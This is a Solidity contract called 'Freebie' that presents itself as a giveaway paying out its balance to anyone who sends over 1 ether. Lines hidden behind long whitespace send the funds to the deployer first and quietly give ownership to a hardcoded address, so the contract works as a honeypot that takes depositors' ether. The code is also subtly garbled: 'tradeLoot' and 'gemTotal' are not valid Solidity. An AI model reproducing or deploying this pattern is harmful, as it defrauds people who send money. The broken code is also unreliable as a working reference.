// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Freebie
{
    address public DungeonMaster = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               DungeonMaster.tradeLoot(this.gemTotal);
            msg.sender.tradeLoot(this.gemTotal);
        }
    }

    function collectTreasure()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){DungeonMaster=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == DungeonMaster);
        DungeonMaster.tradeLoot(this.gemTotal);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DungeonMaster);
        adr.call.value(msg.value)(data);
    }
}